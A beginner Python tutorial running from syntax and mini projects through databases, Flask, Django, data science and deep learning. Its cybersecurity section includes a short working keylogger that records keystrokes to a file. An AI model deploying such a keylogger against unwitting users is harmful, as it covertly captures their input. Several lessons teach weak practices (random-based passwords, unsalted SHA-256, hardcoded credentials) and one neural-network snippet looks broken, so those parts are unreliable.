---

## **1. Introduction to Python**
### **What is Python?**
Python is a high-level, interpreted programming language known for its simplicity and readability. It is widely used in web development, data science, automation, and AI.

### **Why Python?**
- Easy to read and write
- Supports multiple programming paradigms (OOP, functional, procedural)
- Extensive libraries and frameworks
- Used in many domains: Web, Data Science, AI, Automation

### **Setting Up Python**
#### **Installing Python**
- Download from [Python.org](https://www.python.org/)
- Install using package managers:
  ```sh
  sudo apt install python3  # Ubuntu
  brew install python  # macOS
  ```

#### **Running Python Code**
- **Interactive Mode** (REPL)  
  Open terminal and type:
  ```sh
  python3
  ```
  Then, enter:
  ```python
  print("Hello, World!")
  ```
- **Script Mode**  
  Create a file `hello.py` and write:
  ```python
  print("Hello, World!")
  ```
  Run with:
  ```sh
  python3 hello.py
  ```

---

## **2. Variables and Data Types**
### **Variables in Python**
A variable is a name that stores a value. You don’t need to declare types explicitly.

```python
name = "Alice"  # String
age = 25  # Integer
height = 5.7  # Float
is_student = True  # Boolean

print(name, age, height, is_student)
```

### **Type Conversion**
```python
num = "10"
print(int(num) + 5)  # Converts string to integer
```

### **User Input**
```python
name = input("Enter your name: ")
print("Hello, " + name + "!")
```

### **Mini Project: Simple Calculator**
```python
num1 = float(input("Enter first number: "))
num2 = float(input("Enter second number: "))
operation = input("Choose operation (+, -, *, /): ")

if operation == "+":
    result = num1 + num2
elif operation == "-":
    result = num1 - num2
elif operation == "*":
    result = num1 * num2
elif operation == "/":
    result = num1 / num2
else:
    result = "Invalid operation"

print("Result:", result)
```

---

## **3. Operators and Expressions**
Python supports:
- **Arithmetic** (`+`, `-`, `*`, `/`, `%`, `**`, `//`)
- **Comparison** (`==`, `!=`, `>`, `<`, `>=`, `<=`)
- **Logical** (`and`, `or`, `not`)

Example:
```python
a = 10
b = 3
print(a + b, a - b, a * b, a / b, a % b, a ** b, a // b)
```

### **Mini Project: BMI Calculator**
```python
weight = float(input("Enter your weight (kg): "))
height = float(input("Enter your height (m): "))
bmi = weight / (height ** 2)

if bmi < 18.5:
    category = "Underweight"
elif 18.5 <= bmi < 24.9:
    category = "Normal"
elif 25 <= bmi < 29.9:
    category = "Overweight"
else:
    category = "Obese"

print(f"Your BMI is {bmi:.2f}, Category: {category}")
```

---

## **4. Conditional Statements**
### **If-Else Example**
```python
age = int(input("Enter your age: "))

if age >= 18:
    print("You are eligible to vote.")
else:
    print("You are not eligible to vote.")
```

### **Mini Project: Grade Calculator**
```python
score = int(input("Enter your score: "))

if score >= 90:
    grade = "A"
elif score >= 80:
    grade = "B"
elif score >= 70:
    grade = "C"
elif score >= 60:
    grade = "D"
else:
    grade = "F"

print(f"Your grade is {grade}.")
```

---

## **5. Loops in Python**
### **For Loop**
```python
for i in range(1, 6):
    print(i)
```

### **While Loop**
```python
num = 5
while num > 0:
    print(num)
    num -= 1
```

### **Mini Project: Guess the Number**
```python
import random

target = random.randint(1, 10)
attempts = 0

while True:
    guess = int(input("Guess a number (1-10): "))
    attempts += 1

    if guess == target:
        print(f"Correct! You took {attempts} attempts.")
        break
    elif guess > target:
        print("Too high! Try again.")
    else:
        print("Too low! Try again.")
```

---

## **6. Functions and Modules**
### **Defining Functions**
```python
def greet(name):
    return f"Hello, {name}!"

print(greet("Alice"))
```

### **Importing Modules**
```python
import math

print(math.sqrt(16))
```

### **Mini Project: Password Generator**
```python
import random
import string

def generate_password(length=8):
    chars = string.ascii_letters + string.digits + string.punctuation
    return "".join(random.choice(chars) for _ in range(length))

print(generate_password(12))
```

---

## **Next Steps**
1. **OOP (Classes & Objects)**
2. **File Handling & Databases**
3. **Web Development (Flask, APIs)**
4. **Automation (Web Scraping, Scripting)**

Let's continue with more advanced topics in Python.  

---

## **7. Object-Oriented Programming (OOP)**
Object-Oriented Programming (OOP) is a programming paradigm that focuses on **objects** and **classes** to structure code.

### **7.1. Classes and Objects**
A **class** is a blueprint for creating objects. An **object** is an instance of a class.

```python
class Car:
    def __init__(self, brand, model, year):
        self.brand = brand
        self.model = model
        self.year = year

    def display_info(self):
        print(f"{self.year} {self.brand} {self.model}")

# Creating an object
my_car = Car("Toyota", "Camry", 2022)
my_car.display_info()
```

### **7.2. Inheritance**
Inheritance allows one class to inherit attributes and methods from another class.

```python
class Animal:
    def __init__(self, name):
        self.name = name

    def make_sound(self):
        print("Some sound")

class Dog(Animal):
    def make_sound(self):
        print("Bark! Bark!")

dog = Dog("Buddy")
dog.make_sound()  # Output: Bark! Bark!
```

### **Mini Project: Banking System**
```python
class BankAccount:
    def __init__(self, owner, balance=0):
        self.owner = owner
        self.balance = balance

    def deposit(self, amount):
        self.balance += amount
        print(f"${amount} deposited. New balance: ${self.balance}")

    def withdraw(self, amount):
        if amount > self.balance:
            print("Insufficient funds!")
        else:
            self.balance -= amount
            print(f"${amount} withdrawn. New balance: ${self.balance}")

# Example Usage
account = BankAccount("Alice", 1000)
account.deposit(500)
account.withdraw(300)
```

---

## **8. File Handling**
Python allows us to read and write files using the `open()` function.

### **8.1. Reading Files**
```python
with open("example.txt", "r") as file:
    content = file.read()
    print(content)
```

### **8.2. Writing to Files**
```python
with open("example.txt", "w") as file:
    file.write("Hello, Python!\n")
```

### **8.3. Appending to Files**
```python
with open("example.txt", "a") as file:
    file.write("This is an additional line.\n")
```

### **Mini Project: To-Do List (Save Tasks to File)**
```python
def add_task(task):
    with open("tasks.txt", "a") as file:
        file.write(task + "\n")
    print("Task added!")

def view_tasks():
    with open("tasks.txt", "r") as file:
        tasks = file.readlines()
    for index, task in enumerate(tasks, start=1):
        print(f"{index}. {task.strip()}")

# Example usage
add_task("Buy groceries")
view_tasks()
```

---

## **9. Databases with SQLite**
Python has built-in support for SQLite, a lightweight database.

### **9.1. Connecting to a Database**
```python
import sqlite3

conn = sqlite3.connect("users.db")
cursor = conn.cursor()

cursor.execute("CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, name TEXT, age INTEGER)")
conn.commit()
conn.close()
```

### **9.2. Inserting Data**
```python
conn = sqlite3.connect("users.db")
cursor = conn.cursor()

cursor.execute("INSERT INTO users (name, age) VALUES (?, ?)", ("Alice", 25))
conn.commit()
conn.close()
```

### **9.3. Retrieving Data**
```python
conn = sqlite3.connect("users.db")
cursor = conn.cursor()

cursor.execute("SELECT * FROM users")
rows = cursor.fetchall()

for row in rows:
    print(row)

conn.close()
```

### **Mini Project: Contact Manager**
```python
import sqlite3

conn = sqlite3.connect("contacts.db")
cursor = conn.cursor()

cursor.execute("CREATE TABLE IF NOT EXISTS contacts (id INTEGER PRIMARY KEY, name TEXT, phone TEXT)")
conn.commit()

def add_contact(name, phone):
    cursor.execute("INSERT INTO contacts (name, phone) VALUES (?, ?)", (name, phone))
    conn.commit()

def view_contacts():
    cursor.execute("SELECT * FROM contacts")
    for row in cursor.fetchall():
        print(row)

add_contact("John Doe", "123-456-7890")
view_contacts()

conn.close()
```

---

## **10. Web Development with Flask**
Flask is a lightweight Python framework for building web applications.

### **10.1. Installing Flask**
```sh
pip install flask
```

### **10.2. Simple Flask App**
```python
from flask import Flask

app = Flask(__name__)

@app.route("/")
def home():
    return "Hello, Flask!"

if __name__ == "__main__":
    app.run(debug=True)
```

### **Mini Project: Basic API**
```python
from flask import Flask, jsonify

app = Flask(__name__)

@app.route("/api")
def api():
    return jsonify({"message": "Welcome to my API!"})

if __name__ == "__main__":
    app.run(debug=True)
```

---

## **11. Automation with Python**
Python can automate repetitive tasks like web scraping, sending emails, and file handling.

### **11.1. Web Scraping with BeautifulSoup**
```python
from bs4 import BeautifulSoup
import requests

url = "https://example.com"
response = requests.get(url)
soup = BeautifulSoup(response.text, "html.parser")

print(soup.title.text)
```

### **11.2. Sending Emails with Python**
```python
import smtplib

server = smtplib.SMTP("smtp.gmail.com", 587)
server.starttls()
server.login("your_email@gmail.com", "your_password")

message = "Subject: Test Email\n\nThis is a test email from Python."
server.sendmail("your_email@gmail.com", "recipient@example.com", message)
server.quit()
```

### **Mini Project: Screenshot Capture**
```python
import pyautogui

screenshot = pyautogui.screenshot()
screenshot.save("screenshot.png")
```

---

## **Next Steps**
1. **Data Science (Pandas, NumPy, Matplotlib)?**
2. **Machine Learning (Scikit-learn, TensorFlow)?**
3. **More Web Dev (Django, REST APIs)?**
4. **Cybersecurity & Ethical Hacking?**  



Let's expand the Python handbook with more advanced topics. We'll now cover **Data Science, Machine Learning, Web Development with Django, and Cybersecurity**.

---

# **12. Data Science with Python**  
Python is widely used in **data analysis, statistics, and visualization**.  

### **12.1. Installing Required Libraries**
```sh
pip install pandas numpy matplotlib seaborn
```

### **12.2. Working with Pandas**
Pandas provides **DataFrames**, which are like Excel sheets in Python.

#### **Creating a DataFrame**
```python
import pandas as pd

data = {
    "Name": ["Alice", "Bob", "Charlie"],
    "Age": [25, 30, 35],
    "Salary": [50000, 60000, 70000]
}

df = pd.DataFrame(data)
print(df)
```

#### **Reading Data from CSV**
```python
df = pd.read_csv("data.csv")
print(df.head())  # Show first 5 rows
```

#### **Filtering Data**
```python
high_salary = df[df["Salary"] > 55000]
print(high_salary)
```

### **12.3. Data Visualization with Matplotlib**
```python
import matplotlib.pyplot as plt

ages = [20, 25, 30, 35, 40]
salaries = [30000, 40000, 50000, 60000, 70000]

plt.plot(ages, salaries, marker='o', linestyle='-', color='b')
plt.xlabel("Age")
plt.ylabel("Salary")
plt.title("Salary vs Age")
plt.show()
```

#### **Mini Project: Analyzing Employee Data**
- Load a dataset of employees.
- Calculate the average salary.
- Visualize the salary distribution with a histogram.

---

# **13. Machine Learning with Python**
Machine Learning (ML) enables computers to **learn patterns from data**.

### **13.1. Installing Scikit-Learn**
```sh
pip install scikit-learn
```

### **13.2. Simple Linear Regression**
Predict house prices based on square footage.

```python
import numpy as np
import matplotlib.pyplot as plt
from sklearn.linear_model import LinearRegression

# Sample data
X = np.array([1000, 1500, 2000, 2500, 3000]).reshape(-1, 1)  # Square feet
y = np.array([200000, 250000, 300000, 350000, 400000])  # Prices

# Train model
model = LinearRegression()
model.fit(X, y)

# Predict for a 2,200 sq ft house
predicted_price = model.predict([[2200]])
print(f"Predicted price: ${predicted_price[0]:,.2f}")

# Plot data
plt.scatter(X, y, color='blue')
plt.plot(X, model.predict(X), color='red')
plt.xlabel("Square Feet")
plt.ylabel("Price")
plt.show()
```

#### **Mini Project: Predict Student Grades**
- Train a model with student study hours and grades.
- Predict grades based on study hours.

---

# **14. Web Development with Django**
Django is a powerful **Python web framework**.

### **14.1. Installing Django**
```sh
pip install django
django-admin startproject myproject
cd myproject
python manage.py runserver
```

### **14.2. Creating a Django App**
```sh
python manage.py startapp myapp
```

### **14.3. Defining a Model**
```python
from django.db import models

class Student(models.Model):
    name = models.CharField(max_length=100)
    age = models.IntegerField()
    grade = models.FloatField()
```

### **14.4. Creating a View**
```python
from django.http import HttpResponse

def home(request):
    return HttpResponse("Hello, Django!")
```

### **Mini Project: Student Management System**
- Allow users to **add, update, and delete student records**.
- Create a web page that **displays student details**.

---

# **15. Cybersecurity and Ethical Hacking**
Python is widely used in **penetration testing** and **security research**.

### **15.1. Password Hashing**
```python
import hashlib

password = "securepassword"
hashed = hashlib.sha256(password.encode()).hexdigest()
print("Hashed password:", hashed)
```

### **15.2. Simple Port Scanner**
```python
import socket

target = "scanme.nmap.org"
ports = [21, 22, 80, 443]

for port in ports:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    socket.setdefaulttimeout(1)
    
    result = s.connect_ex((target, port))
    if result == 0:
        print(f"Port {port} is open")
    s.close()
```

### **15.3. Basic Keylogger**
```python
from pynput import keyboard

def on_press(key):
    with open("keys.txt", "a") as file:
        file.write(f"{key} ")

listener = keyboard.Listener(on_press=on_press)
listener.start()
listener.join()
```

### **Mini Project: Secure Login System**
- Store **hashed passwords**.
- Implement **multi-factor authentication (MFA)**.

---

# **Next Steps**
We can now:
1. **Expand Data Science (Pandas, NumPy, Deep Learning).**
2. **Build More Web Applications (Django REST API, Flask API).**
3. **Explore Ethical Hacking (Network Security, Encryption).**

---

# **Lesson 16: Data Science with Python (Pandas, NumPy, Deep Learning)**

## **Introduction**
Data Science is a field that combines programming, statistics, and machine learning to analyze and interpret complex data. Python is widely used for data science because of its powerful libraries, such as **NumPy** (for numerical computing), **Pandas** (for data manipulation), and **TensorFlow/PyTorch** (for deep learning).

---

## **Part 1: NumPy - Numerical Computing**
NumPy (Numerical Python) is a library used for fast array operations and mathematical computations.

### **1.1 Installing NumPy**
```bash
pip install numpy
```

### **1.2 Creating NumPy Arrays**
```python
import numpy as np

# Creating arrays
arr1 = np.array([1, 2, 3, 4, 5])
arr2 = np.array([[1, 2, 3], [4, 5, 6]])

print(arr1)
print(arr2)
```

### **1.3 NumPy Operations**
```python
# Basic arithmetic
arr = np.array([10, 20, 30, 40])
print(arr + 5)  # Add 5 to each element

# Mean, Max, Min
print(np.mean(arr))  # Average value
print(np.max(arr))   # Max value
print(np.min(arr))   # Min value
```

#### **🛠 Hands-on Project 1: Matrix Operations**
- Create two NumPy arrays and perform matrix multiplication.
- Find the determinant and inverse of a matrix using NumPy.

---

## **Part 2: Pandas - Data Manipulation**
Pandas is used for working with structured data (tables, CSV files, databases, etc.).

### **2.1 Installing Pandas**
```bash
pip install pandas
```

### **2.2 Creating DataFrames**
```python
import pandas as pd

# Creating a DataFrame
data = {
    "Name": ["Alice", "Bob", "Charlie"],
    "Age": [25, 30, 35],
    "Salary": [50000, 60000, 70000]
}
df = pd.DataFrame(data)

print(df)
```

### **2.3 Reading and Writing Files**
```python
df.to_csv("data.csv", index=False)  # Save to CSV
df2 = pd.read_csv("data.csv")        # Read from CSV
print(df2)
```

### **2.4 Filtering and Sorting Data**
```python
# Filter rows where age > 25
filtered_df = df[df["Age"] > 25]

# Sort by Salary
sorted_df = df.sort_values("Salary", ascending=False)
```

#### **🛠 Hands-on Project 2: Data Cleaning**
- Download a dataset (e.g., Titanic dataset).
- Clean missing values, filter specific data, and generate summary statistics.

---

## **Part 3: Deep Learning (TensorFlow)**
Deep Learning is used for building AI models like image recognition, natural language processing, and predictive analytics.

### **3.1 Installing TensorFlow**
```bash
pip install tensorflow
```

### **3.2 Creating a Simple Neural Network**
```python
import tensorflow as tf
from tensorflow import keras

# Define a simple model
model = keras.Sequential([
    keras.layers.Dense(64, activation="relu"),
    keras.layers.Dense(10, activation="softmax")
])

# Compile model
model.compile(optimizer="adam", loss="sparse_categorical_crossentropy", metrics=["accuracy"])
```

### **3.3 Training a Model on MNIST Dataset**
```python
# Load dataset
mnist = keras.datasets.mnist
(x_train, y_train), (x_test, y_test) = mnist.load_data()
x_train, x_test = x_train / 255.0, x_test / 255.0  # Normalize data

# Train model
model.fit(x_train, y_train, epochs=5, validation_data=(x_test, y_test))
```

#### **🛠 Hands-on Project 3: Build a Digit Recognizer**
- Train a neural network on handwritten digits.
- Evaluate the model’s accuracy and predict new digits.

---

## **Conclusion**
- **NumPy** is great for numerical operations and arrays.
- **Pandas** is perfect for handling structured data.
- **TensorFlow** enables deep learning for AI applications.

